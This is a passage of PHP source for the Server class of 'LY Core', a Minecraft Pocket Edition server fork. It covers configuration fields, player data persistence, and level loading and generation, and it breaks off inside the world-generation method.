<?php

/*
 * ██╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗
 * ██║   ██║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 * ██║   ██║   ██║     ██║   ██║██████╔╝█████╗
 * ██║   ██║   ██║     ██║   ██║██╔══██╗██╔══╝
 * ╚██████╔╝██╗╚██████╗╚██████╔╝██║  ██║███████╗
 *  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @Author: U core
 *
 * @Links:
 *  > LY Core
 *  > LY Core Project
*/

namespace lycore;

use lycore\block\Block;
use lycore\command\CommandReader;
use lycore\command\CommandSender;
use lycore\command\ConsoleCommandSender;
use lycore\command\PluginIdentifiableCommand;
use lycore\command\SimpleCommandMap;
use lycore\entity\Arrow;
use lycore\entity\Attribute;
use lycore\entity\Effect;
use lycore\entity\Egg;
use lycore\entity\Entity;
use lycore\entity\FallingSand;
use lycore\entity\FishingHook;
use lycore\entity\Human;
use lycore\entity\Bot;
use lycore\entity\Item as DroppedItem;
use lycore\entity\MinecartChest;
use lycore\entity\MinecartHopper;
use lycore\entity\MinecartTNT;
use lycore\entity\PrimedTNT;
use lycore\entity\Rabbit;
use lycore\entity\Snowball;
use lycore\entity\Squid;
use lycore\entity\Villager;
use lycore\entity\Zombie;
use lycore\entity\ZombieVillager;
use lycore\event\HandlerList;
use lycore\event\level\LevelInitEvent;
use lycore\event\level\LevelLoadEvent;
use lycore\event\server\QueryRegenerateEvent;
use lycore\event\server\ServerCommandEvent;
use lycore\event\Timings;
use lycore\event\TimingsHandler;
use lycore\event\TranslationContainer;
use lycore\inventory\CraftingManager;
use lycore\inventory\FurnaceRecipe;
use lycore\inventory\InventoryType;
use lycore\inventory\Recipe;
use lycore\inventory\ShapedRecipe;
use lycore\inventory\ShapelessRecipe;
use lycore\item\enchantment\Enchantment;
use lycore\item\enchantment\EnchantmentLevelTable;
use lycore\item\Item;
use lycore\lang\BaseLang;
use lycore\level\format\anvil\Anvil;
use lycore\level\format\leveldb\LevelDB;
use lycore\level\format\LevelProviderManager;
use lycore\level\format\mcregion\McRegion;
use lycore\level\generator\biome\Biome;
use lycore\level\generator\Flat;
use lycore\level\generator\Generator;
use lycore\level\generator\hell\Nether;
use lycore\level\generator\normal\Normal;
use lycore\level\generator\VoidGenerator;
use lycore\level\AntiXrayObfuscator;
use lycore\level\Level;
use lycore\metadata\EntityMetadataStore;
use lycore\metadata\LevelMetadataStore;
use lycore\metadata\PlayerMetadataStore;
use lycore\math\Vector3;
use lycore\nbt\NBT;
use lycore\nbt\tag\ByteTag;
use lycore\nbt\tag\CompoundTag;
use lycore\nbt\tag\DoubleTag;
use lycore\nbt\tag\ListTag;
use lycore\nbt\tag\FloatTag;
use lycore\nbt\tag\IntTag;
use lycore\nbt\tag\LongTag;
use lycore\nbt\tag\ShortTag;
use lycore\nbt\tag\StringTag;
use lycore\network\CompressBatchedTask;
use lycore\network\DataPacketManager;
use lycore\network\Network;
use lycore\network\protocol\BatchPacket;
use lycore\network\protocol\CraftingDataPacket;
use lycore\network\protocol\DataPacket;
use lycore\network\protocol\v11\DataPacket as DataPacketV11;
use lycore\network\protocol\v84\DataPacketV84;
use lycore\network\protocol\PlayerListPacket;
use lycore\network\protocol\ProtocolCompatibility;
use lycore\network\query\QueryHandler;
use lycore\network\RakLibInterface;
use lycore\network\rcon\RCON;
use lycore\network\SourceInterface;
use lycore\network\upnp\UPnP;
use lycore\permission\BanList;
use lycore\permission\DefaultPermissions;
use lycore\plugin\FolderPluginLoader;
use lycore\plugin\PharPluginLoader;
use lycore\plugin\Php8FatalRecovery;
use lycore\plugin\Plugin;
use lycore\plugin\PluginLoadOrder;
use lycore\plugin\PluginManager;
use lycore\plugin\PluginSourceCompatibility;
use lycore\plugin\ScriptPluginLoader;
use lycore\scheduler\FileWriteTask;
use lycore\scheduler\SendUsageTask;
use lycore\scheduler\ServerScheduler;
use lycore\tile\BrewingStand;
use lycore\tile\Cauldron;
use lycore\tile\Chest;
use lycore\tile\Comparator;
use lycore\tile\MinecartChest as MinecartChestTile;
use lycore\tile\MovingBlock as MovingBlockTile;
use lycore\tile\PistonArm;
use lycore\tile\Dispenser;
use lycore\tile\DLDetector;
use lycore\tile\Dropper;
use lycore\tile\EnchantTable;
use lycore\tile\FlowerPot;
use lycore\tile\Furnace;
use lycore\tile\Hopper;
use lycore\tile\ItemFrame;
use lycore\tile\MobSpawner;
use lycore\tile\Sign;
use lycore\tile\Skull;
use lycore\tile\Tile;
use lycore\utils\Binary;
use lycore\utils\Color;
use lycore\utils\Config;
use lycore\utils\LevelException;
use lycore\utils\MainLogger;
use lycore\utils\ServerException;
use lycore\utils\ServerKiller;
use lycore\utils\Terminal;
use lycore\utils\TextFormat;
use lycore\utils\TextWrapper; //原注释代码
use lycore\utils\Utils;
use lycore\utils\UUID;
use lycore\utils\VersionString;

use lycore\entity\Chicken;
use lycore\entity\Cow;
use lycore\entity\Pig;
use lycore\entity\Horse;
use lycore\entity\Sheep;
use lycore\entity\Wolf;
use lycore\entity\Fireball;
use lycore\entity\Mooshroom;
use lycore\entity\Creeper;
use lycore\entity\Husk;
use lycore\entity\Skeleton;
use lycore\entity\Spider;
use lycore\entity\PigZombie;
use lycore\entity\Slime;
use lycore\entity\Enderman;
use lycore\entity\Silverfish;
use lycore\entity\CaveSpider;
use lycore\entity\Ghast;
use lycore\entity\LavaSlime;
use lycore\entity\Bat;
use lycore\entity\Blaze;
use lycore\entity\Witch;
use lycore\entity\Stray;
use lycore\entity\Ocelot;
use lycore\entity\IronGolem;
use lycore\entity\SnowGolem;
use lycore\entity\Lightning;
use lycore\entity\LeashKnot;
use lycore\entity\XPOrb;
use lycore\entity\behavior\AIHolder;
use lycore\entity\SmallFireball;
use lycore\entity\ThrownExpBottle;
use lycore\entity\Boat;
use lycore\entity\Minecart;
use lycore\entity\ThrownPotion;
use lycore\entity\Painting;
use lycore\scheduler\DServerTask;
use lycore\scheduler\CallbackTask;
use synapse\Synapse;

use lycore\item\map\MapData;

/**
 * The class that manages everything
 */
class Server{
	const BROADCAST_CHANNEL_ADMINISTRATIVE = "lycore.broadcast.admin";
	const BROADCAST_CHANNEL_USERS = "lycore.broadcast.user";

	const PLAYER_MSG_TYPE_MESSAGE = 0;
	const PLAYER_MSG_TYPE_TIP = 1;
	const PLAYER_MSG_TYPE_POPUP = 2;
	const MAX_AUTO_ASYNC_WORKERS = 2;

	/** @var Server */
	private static $instance = null;

	/** @var \Threaded */
	private static $sleeper = null;

	/** @var BanList */
	private $banByName = null;

	/** @var BanList */
	private $banByIP = null;

	/** @var BanList */
	private $banByCID = \null;

	/** @var Config */
	private $operators = null;

	/** @var Config */
	private $whitelist = null;

	/** @var bool */
	private $isRunning = true;

	private $hasStopped = false;

	/** @var PluginManager */
	private $pluginManager = null;

	private $profilingTickRate = 20;

	/** @var ServerScheduler */
	private $scheduler = null;

	/**
	 * Counts the ticks since the server start
	 *
	 * @var int
	 */
	private $tickCounter;
	private $nextTick = 0;
	private $tickAverage = [20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20];
	private $useAverage = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
	private $maxTick = 20;
	private $maxUse = 0;

	private $sendUsageTicker = 0;

	private $dispatchSignals = false;

	/** @var \AttachableThreadedLogger */
	private $logger;

	/** @var MemoryManager */
	private $memoryManager;

	/** @var CommandReader */
	private $console = null;
	//private $consoleThreaded;

	/** @var SimpleCommandMap */
	private $commandMap = null;

	/** @var CraftingManager */
	private $craftingManager;

	/** @var ConsoleCommandSender */
	private $consoleSender;

	/** @var int */
	private $maxPlayers;

	/** @var bool */
	private $autoSave;

	/** @var RCON */
	private $rcon;

	/** @var EntityMetadataStore */
	private $entityMetadata;

	/** @var PlayerMetadataStore */
	private $playerMetadata;

	/** @var LevelMetadataStore */
	private $levelMetadata;

	/** @var Network */
	private $network;

	private $networkCompressionAsync = true;
	public $networkCompressionLevel = 7;
	public $LYCoreVersion = "v1.2";

	private $autoTickRate = true;
	private $autoTickRateLimit = 20;
	private $alwaysTickPlayers = false;
	private $baseTickRate = 1;

	private $autoSaveTicker = 0;
	private $autoSaveTicks = 6000;

	/** @var BaseLang */
	private $baseLang;

	private $forceLanguage = false;

	private $serverID;

	private $autoloader;
	private $filePath;
	private $dataPath;
	private $pluginPath;

	private $uniquePlayers = [];

	/** @var QueryHandler */
	private $queryHandler;

	/** @var QueryRegenerateEvent */
	private $queryRegenerateTask = null;

	/** @var Config */
	private $properties;

	private $propertyCache = [];

	/** @var Config */
	private $config;

	/** @var Player[] */
	private $players = [];

	/** @var Player[] */
	private $playerList = [];

	private $identifiers = [];

	/** @var Level[] */
	private $levels = [];

	/** @var Level */
	private $levelDefault = null;

	public $aboutstring = "";

	/** Advanced Config */
	public $advancedConfig = null;
	private $advancedConfigMigrated = false;
	public $worldBehaviorConfig = [];

	public $weatherEnabled = true;
	public $foodEnabled = true;
	public $expEnabled = true;
	public $keepInventory = false;
	public $netherEnabled = false;
	public $netherName = "nether";
	public $netherLevel = null;
	public $portalWorldName = "world";
	public $enderEnabled = false;
	public $enderName = "ender";
	public $enderLevel = null;
	public $skyworldEnabled = false;
	public $skyworldName = "skyworld";
	public $skyworldLevel = null;
	public $weatherRandomDurationMin = 6000;
	public $weatherRandomDurationMax = 12000;
	public $lookup = [];
	public $hungerHealth = 10;
	public $lightningTime = 200;
	public $lightningFire = false;
	public $expCache = [];
	public $expWriteAhead = 200;
	public $aiConfig = [];
	public $aiEnabled = false;
	public $aiHolder = null;
	public $inventoryNum = 36;
	public $hungerTimer = 80;
	public $version;
	public $allowSnowGolem;
	public $allowIronGolem;
	public $autoClearInv = true;
	public $dserverConfig = [];
	public $dserverPlayers = 0;
	public $dserverAllPlayers = 0;
	public $redstoneEnabled = false;
	public $allowFrequencyPulse = true;
	public $redstoneHighFrequencyBroadcastMessage = "§c[RedstoneGuard] 检测到高频红石，已移除 {world} ({x}, {y}, {z}) 附近装置，方块: {block}，附近玩家: {players}";
	public $anviletEnabled = false;
	public $anvilEnabled = true;
	public $enchantingTableEnabled = true;
	public $enchantingBookshelfCheckEnabled = true;
	public $playerCollide = true;
	public $tntExplosionEnabled = true;
	public $pulseFrequency = 1.0;
	public $playerMsgType = self::PLAYER_MSG_TYPE_MESSAGE;
	public $playerLoginMsg = "";
	public $playerLogoutMsg = "";
	public $antiFly = false;
	public $antiFastEat = false;
	public $antiFastBreak = false;
	public $antiGameSpeed = false;
	public $antiToolbox = false;
	public $asyncChunkRequest = true;
	public $recipesFromJson = false;
	public $creativeItemsFromJson = false;
	public $minecartMovingType = 0;
	public $checkMovement = false;
	public $keepExperience = false;
	public $limitedCreative = true;
	public $chunkRadius = -1;
	public $destroyBlockParticle = true;
	public $allowSplashPotion = true;
	public $fireSpread = false;
	public $advancedCommandSelector = false;
	public $synapseConfig = [];
	public $netshBlock = false;
	public $antiXray = true;
	public $antiXrayMode = "obfuscator";
	public $antiXrayScanChunkHeightLimit = 4;
	public $antiXrayOverworldFakeBlock = 1;
	public $antiXrayNetherFakeBlock = 87;
	public $antiXrayOres = null;
	public $antiXrayFilters = null;
	public $antiXrayWorlds = null;
	public $antiXrayMemoryCache = false;
	/** @var CraftingDataPacket[] */
	private $recipeLists = [];

	/** @var Synapse */
	private $synapse = null;
	

	/**
	 * @return string
	 */
	public function getName() : string{
		return "LY Core";
	}

	/**
	 * @return bool
	 */
	public function isRunning(){
		return $this->isRunning === true;
	}

	/**
	 * @return string
	 */
	public function getPocketMineVersion(){
		return \lycore\VERSION;
	}

	/**
	 * @return string
	 */
	public function getCodename(){
		return \lycore\CODENAME;
	}

	/**
	 * @return string
	 */
	public function getVersion(){
		return \lycore\MINECRAFT_VERSION;
	}

	/**
	 * @return string
	 */
	public function getApiVersion(){
		return \lycore\API_VERSION;
	}

	/**
	 * @return string
	 */
	public function getIncoreApi(){
		return "API-key Passed";
	}


	/**
	 * @return string
	 */
	public function getiTXApiVersion(){
		return \lycore\LY_CORE_API_VERSION;
	}

	/**
	 * @return string
	 */
	public function getGeniApiVersion(){
		return \lycore\LY_CORE_API_VERSION;
	}

	/**
	 * @return string
	 */
	public function getFilePath(){
		return $this->filePath;
	}

	/**
	 * @return string
	 */
	public function getDataPath(){
		return $this->dataPath;
	}

	/**
	 * @return string
	 */
	public function getPluginPath(){
		return $this->pluginPath;
	}

	/**
	 * @return int
	 */
	public function getMaxPlayers(){
		return $this->maxPlayers;
	}

	/**
	 * @return int
	 */
	public function getPort(){
		return $this->getConfigInt("server-port", 19132);
	}

	/**
	 * @return int
	 */
	public function getViewDistance(){
		return max(56, $this->getProperty("chunk-sending.max-chunks", 256));
	}

	/**
	 * @return string
	 */
	public function getIp(){
		return $this->getConfigString("server-ip", "0.0.0.0");
	}

	/**
	 * @deprecated
	 */
	public function getServerName(){
		return $this->getConfigString("motd", "Minecraft PE 0.14 Server");
	}

	public function getServerUniqueId(){
		return $this->serverID;
	}

	/**
	 * @return bool
	 */
	public function getAutoSave(){
		return $this->autoSave;
	}

	/**
	 * @param bool $value
	 */
	public function setAutoSave($value){
		$this->autoSave = (bool) $value;
		foreach($this->getLevels() as $level){
			$level->setAutoSave($this->autoSave);
		}
	}

	/**
	 * @return string
	 */
	public function getLevelType(){
		return $this->getConfigString("level-type", "DEFAULT");
	}

	/**
	 * @return bool
	 */
	public function getGenerateStructures(){
		return $this->getConfigBoolean("generate-structures", true);
	}

	/**
	 * @return int
	 */
	public function getGamemode(){
		return $this->getConfigInt("gamemode", 0) & 0b11;
	}

	/**
	 * @return bool
	 */
	public function getForceGamemode(){
		return $this->getConfigBoolean("force-gamemode", false);
	}

	/**
	 * Returns the gamemode text name
	 *
	 * @param int $mode
	 *
	 * @return string
	 */
	public static function getGamemodeString($mode){
		switch((int) $mode){
			case Player::SURVIVAL:
				return "%gameMode.survival";
			case Player::CREATIVE:
				return "%gameMode.creative";
			case Player::ADVENTURE:
				return "%gameMode.adventure";
			case Player::SPECTATOR:
				return "%gameMode.spectator";
		}

		return "UNKNOWN";
	}

	/**
	 * Parses a string and returns a gamemode integer, -1 if not found
	 *
	 * @param string $str
	 *
	 * @return int
	 */
	public static function getGamemodeFromString($str){
		switch(strtolower(trim($str))){
			case (string) Player::SURVIVAL:
			case "survival":
			case "s":
				return Player::SURVIVAL;

			case (string) Player::CREATIVE:
			case "creative":
			case "c":
				return Player::CREATIVE;

			case (string) Player::ADVENTURE:
			case "adventure":
			case "a":
				return Player::ADVENTURE;

			case (string) Player::SPECTATOR:
			case "spectator":
			case "view":
			case "v":
				return Player::SPECTATOR;
		}
		return -1;
	}

	/**
	 * @param string $str
	 *
	 * @return int
	 */
	public static function getDifficultyFromString($str){
		switch(strtolower(trim($str))){
			case "0":
			case "peaceful":
			case "p":
				return 0;

			case "1":
			case "easy":
			case "e":
				return 1;

			case "2":
			case "normal":
			case "n":
				return 2;

			case "3":
			case "hard":
			case "h":
				return 3;
		}
		return -1;
	}

	/**
	 * @return int
	 */
	public function getDifficulty(){
		return $this->getConfigInt("difficulty", 1);
	}

	/**
	 * @return bool
	 */
	public function hasWhitelist(){
		return $this->getConfigBoolean("white-list", false);
	}

	/**
	 * @return int
	 */
	public function getSpawnRadius(){
		return $this->getConfigInt("spawn-protection", 16);
	}

	/**
	 * @return bool
	 */
	public function getAllowFlight(){
		return $this->getConfigBoolean("allow-flight", false);
	}

	/**
	 * @return bool
	 */
	public function isHardcore(){
		return $this->getConfigBoolean("hardcore", false);
	}

	/**
	 * @return int
	 */
	public function getDefaultGamemode(){
		return $this->getConfigInt("gamemode", 0) & 0b11;
	}

	/**
	 * @return string
	 */
	public function getMotd(){
		return $this->getConfigString("motd", "Minecraft PE 0.14 Server");
	}

	/**
	 * @return \ClassLoader
	 */
	public function getLoader(){
		return $this->autoloader;
	}

	/**
	 * @return MainLogger
	 */
	public function getLogger(){
		return $this->logger;
	}

	/**
	 * @return EntityMetadataStore
	 */
	public function getEntityMetadata(){
		return $this->entityMetadata;
	}

	/**
	 * @return PlayerMetadataStore
	 */
	public function getPlayerMetadata(){
		return $this->playerMetadata;
	}

	/**
	 * @return LevelMetadataStore
	 */
	public function getLevelMetadata(){
		return $this->levelMetadata;
	}

	/**
	 * @return PluginManager
	 */
	public function getPluginManager(){
		return $this->pluginManager;
	}

	/**
	 * @return CraftingManager
	 */
	public function getCraftingManager(){
		return $this->craftingManager;
	}

	/**
	 * @return ServerScheduler
	 */
	public function getScheduler(){
		return $this->scheduler;
	}

	/**
	 * @return int
	 */
	public function getTick(){
		return $this->tickCounter;
	}

	public function getAIHolder(){
		return $this->aiHolder;
	}

	/**
	 * Returns the last server TPS measure
	 *
	 * @return float
	 */
	public function getTicksPerSecond(){
		return round($this->maxTick, 2);
	}

	/**
	 * Returns the last server TPS average measure
	 *
	 * @return float
	 */
	public function getTicksPerSecondAverage(){
		return round(array_sum($this->tickAverage) / count($this->tickAverage), 2);
	}

	/**
	 * Returns the TPS usage/load in %
	 *
	 * @return float
	 */
	public function getTickUsage(){
		return round($this->maxUse * 100, 2);
	}

	/**
	 * Returns the TPS usage/load average in %
	 *
	 * @return float
	 */
	public function getTickUsageAverage(){
		return round((array_sum($this->useAverage) / count($this->useAverage)) * 100, 2);
	}


	/**
	 * @deprecated
	 *
	 * @param     $address
	 * @param int $timeout
	 */
	public function blockAddress($address, $timeout = 300){
		$this->network->blockAddress($address, $timeout);
	}

	/**
	 * @deprecated
	 *
	 * @param $address
	 * @param $port
	 * @param $payload
	 */
	public function sendPacket($address, $port, $payload){
		$this->network->sendPacket($address, $port, $payload);
	}

	/**
	 * @deprecated
	 *
	 * @return SourceInterface[]
	 */
	public function getInterfaces(){
		return $this->network->getInterfaces();
	}

	/**
	 * @deprecated
	 *
	 * @param SourceInterface $interface
	 */
	public function addInterface(SourceInterface $interface){
		$this->network->registerInterface($interface);
	}

	/**
	 * @deprecated
	 *
	 * @param SourceInterface $interface
	 */
	public function removeInterface(SourceInterface $interface){
		$interface->shutdown();
		$this->network->unregisterInterface($interface);
	}

	/**
	 * @return SimpleCommandMap
	 */
	public function getCommandMap(){
		return $this->commandMap;
	}

	/**
	 * @return Player[]
	 */
	public function getOnlinePlayers(){
		return $this->playerList;
	}

	public function addRecipe(Recipe $recipe){
		$this->craftingManager->registerRecipe($recipe);
		$this->generateRecipeList();
	}

	/**
	 * @param string $name
	 *
	 * @return OfflinePlayer|Player
	 */
	public function getOfflinePlayer($name){
		$name = strtolower($name);
		$result = $this->getPlayerExact($name);

		if($result === null){
			$result = new OfflinePlayer($this, $name);
		}

		return $result;
	}

	/**
	 * @param string $name
	 *
	 * @return CompoundTag
	 */
	public function getOfflinePlayerData($name){
		$name = strtolower($name);
		$path = $this->getDataPath() . "players/";
		if(file_exists($path . "$name.dat")){
			try{
				$nbt = new NBT(NBT::BIG_ENDIAN);
				$nbt->readCompressed(file_get_contents($path . "$name.dat"));

				return $nbt->getData();
			}catch(\Throwable $e){ //zlib decode error / corrupt data
				rename($path . "$name.dat", $path . "$name.dat.bak");
				$this->logger->notice($this->getLanguage()->translateString("pocketmine.data.playerCorrupted", [$name]));
			}
		}else{
			$this->logger->notice($this->getLanguage()->translateString("pocketmine.data.playerNotFound", [$name]));
		}
		$spawn = $this->getDefaultLevel()->getSafeSpawn();
		$nbt = new CompoundTag("", [
			new LongTag("firstPlayed", floor(microtime(true) * 1000)),
			new LongTag("lastPlayed", floor(microtime(true) * 1000)),
			new ListTag("Pos", [
				new DoubleTag(0, $spawn->x),
				new DoubleTag(1, $spawn->y),
				new DoubleTag(2, $spawn->z)
			]),
			new StringTag("Level", $this->getDefaultLevel()->getName()),
			//new StringTag("SpawnLevel", $this->getDefaultLevel()->getName()),
			//new IntTag("SpawnX", (int) $spawn->x),
			//new IntTag("SpawnY", (int) $spawn->y),
			//new IntTag("SpawnZ", (int) $spawn->z),
			//new ByteTag("SpawnForced", 1), //TODO
			new ListTag("Inventory", []),
			new CompoundTag("Achievements", []),
			new IntTag("playerGameType", $this->getGamemode()),
			new ListTag("Motion", [
				new DoubleTag(0, 0.0),
				new DoubleTag(1, 0.0),
				new DoubleTag(2, 0.0)
			]),
			new ListTag("Rotation", [
				new FloatTag(0, 0.0),
				new FloatTag(1, 0.0)
			]),
			new FloatTag("FallDistance", 0.0),
			new ShortTag("Fire", 0),
			new ShortTag("Air", 300),
			new ByteTag("OnGround", 1),
			new ByteTag("Invulnerable", 0),
			new StringTag("NameTag", $name),
			new ShortTag("Hunger", 20),
			new ShortTag("Health", 20),
			new ShortTag("MaxHealth", 20),
			new LongTag("Experience", 0),
			new LongTag("ExpLevel", 0),
		]);
		$nbt->Pos->setTagType(NBT::TAG_Double);
		$nbt->Inventory->setTagType(NBT::TAG_Compound);
		$nbt->Motion->setTagType(NBT::TAG_Double);
		$nbt->Rotation->setTagType(NBT::TAG_Float);

		if(file_exists($path . "$name.yml")){ //Importing old LY Core files
			$data = new Config($path . "$name.yml", Config::YAML, []);
			$nbt["playerGameType"] = (int) $data->get("gamemode");
			$nbt["Level"] = $data->get("position")["level"];
			$nbt["Pos"][0] = $data->get("position")["x"];
			$nbt["Pos"][1] = $data->get("position")["y"];
			$nbt["Pos"][2] = $data->get("position")["z"];
			$nbt["SpawnLevel"] = $data->get("spawn")["level"];
			$nbt["SpawnX"] = (int) $data->get("spawn")["x"];
			$nbt["SpawnY"] = (int) $data->get("spawn")["y"];
			$nbt["SpawnZ"] = (int) $data->get("spawn")["z"];
			$this->logger->notice($this->getLanguage()->translateString("pocketmine.data.playerOld", [$name]));
			foreach($data->get("inventory") as $slot => $item){
				if(count($item) === 3){
					$nbt->Inventory[$slot + 9] = new CompoundTag("", [
						new ShortTag("id", $item[0]),
						new ShortTag("Damage", $item[1]),
						new ByteTag("Count", $item[2]),
						new ByteTag("Slot", $slot + 9),
						new ByteTag("TrueSlot", $slot + 9)
					]);
				}
			}
			foreach($data->get("hotbar") as $slot => $itemSlot){
				if(isset($nbt->Inventory[$itemSlot + 9])){
					$item = $nbt->Inventory[$itemSlot + 9];
					$nbt->Inventory[$slot] = new CompoundTag("", [
						new ShortTag("id", $item["id"]),
						new ShortTag("Damage", $item["Damage"]),
						new ByteTag("Count", $item["Count"]),
						new ByteTag("Slot", $slot),
						new ByteTag("TrueSlot", $item["TrueSlot"])
					]);
				}
			}
			foreach($data->get("armor") as $slot => $item){
				if(count($item) === 2){
					$nbt->Inventory[$slot + 100] = new CompoundTag("", [
						new ShortTag("id", $item[0]),
						new ShortTag("Damage", $item[1]),
						new ByteTag("Count", 1),
						new ByteTag("Slot", $slot + 100)
					]);
				}
			}
			foreach($data->get("achievements") as $achievement => $status){
				$nbt->Achievements[$achievement] = new ByteTag($achievement, $status == true ? 1 : 0);
			}
			unlink($path . "$name.yml");
		}
		$this->saveOfflinePlayerData($name, $nbt);

		return $nbt;

	}

	/**
	 * @param string   $name
	 * @param CompoundTag $nbtTag
	 * @param bool     $async
	 */
	public function saveOfflinePlayerData($name, CompoundTag $nbtTag, $async = false){
		$nbt = new NBT(NBT::BIG_ENDIAN);
		try{
			$nbt->setData($nbtTag);

			if($async){
				$this->getScheduler()->scheduleAsyncTask(new FileWriteTask($this->getDataPath() . "players/" . strtolower($name) . ".dat", $nbt->writeCompressed()));
			}else{
				file_put_contents($this->getDataPath() . "players/" . strtolower($name) . ".dat", $nbt->writeCompressed());
			}
		}catch(\Throwable $e){
			$this->logger->critical($this->getLanguage()->translateString("pocketmine.data.saveError", [$name, $e->getMessage()]));
			if(\lycore\DEBUG > 1 and $this->logger instanceof MainLogger){
				$this->logger->logException($e);
			}
		}
	}

	/**
	 * @param string $name
	 *
	 * @return Player
	 */
	public function getPlayer(string $name){
		$found = null;
		$name = strtolower($name);
		$delta = PHP_INT_MAX;
		foreach($this->getOnlinePlayers() as $player){
			if(stripos($player->getName(), $name) === 0){
				$curDelta = strlen($player->getName()) - strlen($name);
				if($curDelta < $delta){
					$found = $player;
					$delta = $curDelta;
				}
				if($curDelta === 0){
					break;
				}
			}
		}

		return $found;
	}

	/**
	 * @param string $name
	 *
	 * @return Player
	 */
	public function getPlayerExact(string $name){
		$name = strtolower($name);
		foreach($this->getOnlinePlayers() as $player){
			if(strtolower($player->getName()) === $name){
				return $player;
			}
		}

		return null;
	}

	/**
	 * @param string $partialName
	 *
	 * @return Player[]
	 */
	public function matchPlayer($partialName){
		$partialName = strtolower($partialName);
		$matchedPlayers = [];
		foreach($this->getOnlinePlayers() as $player){
			if(strtolower($player->getName()) === $partialName){
				$matchedPlayers = [$player];
				break;
			}elseif(stripos($player->getName(), $partialName) !== false){
				$matchedPlayers[] = $player;
			}
		}

		return $matchedPlayers;
	}

	/**
	 * @param Player $player
	 */
	public function removePlayer(Player $player){
		if(isset($this->identifiers[$hash = spl_object_hash($player)])){
			$identifier = $this->identifiers[$hash];
			unset($this->players[$identifier]);
			unset($this->identifiers[$hash]);
			return;
		}

		foreach($this->players as $identifier => $p){
			if($player === $p){
				unset($this->players[$identifier]);
				unset($this->identifiers[spl_object_hash($player)]);
				break;
			}
		}
	}

	/**
	 * @return Level[]
	 */
	public function getLevels(){
		return $this->levels;
	}

	/**
	 * @return Level
	 */
	public function getDefaultLevel(){
		return $this->levelDefault;
	}

	/**
	 * Sets the default level to a different level
	 * This won't change the level-name property,
	 * it only affects the server on runtime
	 *
	 * @param Level $level
	 */
	public function setDefaultLevel($level){
		if($level === null or ($this->isLevelLoaded($level->getFolderName()) and $level !== $this->levelDefault)){
			$this->levelDefault = $level;
		}
	}

	/**
	 * @param string $name
	 *
	 * @return bool
	 */
	public function isLevelLoaded($name){
		return $this->getLevelByName($name) instanceof Level;
	}

	/**
	 * @param int $levelId
	 *
	 * @return Level
	 */
	public function getLevel($levelId){
		if(isset($this->levels[$levelId])){
			return $this->levels[$levelId];
		}

		return null;
	}

	/**
	 * @param $name
	 *
	 * @return Level
	 */
	public function getLevelByName($name){
		$name = trim((string) $name);
		foreach($this->getLevels() as $level){
			if($level->isClosed()){
				continue;
			}
			if($level->getFolderName() === $name or $level->getName() === $name){
				return $level;
			}
		}

		foreach($this->getLevels() as $level){
			if($level->isClosed()){
				continue;
			}
			if(strcasecmp($level->getFolderName(), $name) === 0 or strcasecmp($level->getName(), $name) === 0){
				return $level;
			}
		}

		return null;
	}

	/**
	 * @param Level $level
	 * @param bool  $forceUnload
	 *
	 * @return bool
	 */
	public function unloadLevel(Level $level, $forceUnload = false){
		if($level === $this->getDefaultLevel() and !$forceUnload){
			throw new \InvalidStateException("The default level cannot be unloaded while running, please switch levels.");
		}
		if($level->unload($forceUnload) === true){
			unset($this->levels[$level->getId()]);

			return true;
		}

		return false;
	}

	/**
	 * Loads a level from the data directory
	 *
	 * @param string $name
	 *
	 * @return bool
	 *
	 * @throws LevelException
	 */
	public function loadLevel($name){
		if(trim($name) === ""){
			throw new LevelException("Invalid empty level name");
		}
		if($this->isLevelLoaded($name)){
			return true;
		}elseif(!$this->isLevelGenerated($name)){
			$this->logger->notice($this->getLanguage()->translateString("pocketmine.level.notFound", [$name]));

			return false;
		}

		$path = $this->getDataPath() . "worlds/" . $name . "/";

		$provider = LevelProviderManager::getProvider($path);

		if($provider === null){
			$this->logger->error($this->getLanguage()->translateString("pocketmine.level.loadError", [$name, "Unknown provider"]));

			return false;
		}
		//$entities = new Config($path."entities.yml", Config::YAML);
		//if(file_exists($path . "tileEntities.yml")){
		//	@rename($path . "tileEntities.yml", $path . "tiles.yml");
		//}

		try{
			$level = new Level($this, $name, $path, $provider);
		}catch(\Throwable $e){

			$this->logger->error($this->getLanguage()->translateString("pocketmine.level.loadError", [$name, $e->getMessage()]));
			if($this->logger instanceof MainLogger){
				$this->logger->logException($e);
			}
			return false;
		}

		$this->levels[$level->getId()] = $level;

		$level->initLevel();

		$this->getPluginManager()->callEvent(new LevelLoadEvent($level));

		$level->setTickRate($this->baseTickRate);

		return true;
	}

	/**
	 * Generates a new level if it does not exists
	 *
	 * @param string $name
	 * @param int    $seed
	 * @param string $generator Class name that extends pocketmine\level\generator\Noise
	 * @param array  $options
	 *
	 * @return bool
	 */
	public function generateLevel($name, $seed = null, $generator = null, $options = []){
		if(trim($name) === "" or $this->isLevelGenerated($name)){
			return false;
		}

		$seed = $seed === null ? Binary::readInt(@Utils::getRandomBytes(4, false)) : (int) $seed;

		if(!isset($options["preset"])){
			$options["preset"] = $this->getConfigString("generator-settings", "");
		}

		if(!($generator !== null and class_exists($generator, true) and is_subclass_of($generator, Generator::class))){
			$generator = Generator::getGenerator($this->getLevelType());
		}

		if(($provider = LevelProviderManager::getProviderByName($providerName = $this->getProperty("level-settings.default-format", "mcregion"))) === null){
			$provider = LevelProviderManager::getProviderByName($providerName = "mcregion");
		}

		try{
			$path = $this->getDataPath() . "worlds/" . $name . "/";
			/** @var \lycore\level\format\LevelProvider $provider */
			$provider::generate($path, $name, $seed, $generator, $options);

			$level = new Level($this, $name, $path, $provider);
			$this->levels[$level->getId()] = $level;

			$level->initLevel();

			$level->setTickRate($this->baseTickRate);
		}catch(\Throwable $e){
			$this->logger->error($this->getLanguage()->translateString("pocketmine.level.generateError", [$name, $e->getMessage()]));
			if($this->logger instanceof MainLogger){
				$this->logger->logException($e);
			}
			return false;
		}

		$this->getPluginManager()->callEvent(new LevelInitEvent($level));

		$this->getPluginManager()->callEvent(new LevelLoadEvent($level));

